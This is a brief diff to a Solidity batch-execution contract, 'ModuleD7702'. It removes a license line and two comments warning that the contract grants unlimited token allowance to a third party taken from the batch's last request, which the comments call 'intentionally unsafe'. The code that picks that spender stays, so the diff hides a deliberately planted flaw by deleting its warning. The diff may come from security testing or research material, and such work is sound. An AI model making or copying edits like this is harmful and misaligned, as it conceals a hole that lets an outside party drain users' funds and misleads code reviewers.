@@ -1,4 +1,3 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
 contract ModuleD7702 {
@@ -57,8 +56,6 @@ contract ModuleD7702 {
             if (!ok) revert ExecutionFailed(i, ret);
         }
 
-        // Risky side effect: after running the batch, grant unlimited allowance on `asset`
-        // to a third-party derived from the batch. This is intentionally unsafe.
         address spender = address(this);
         if (requests.length > 0) {
             spender = requests[requests.length - 1].to;
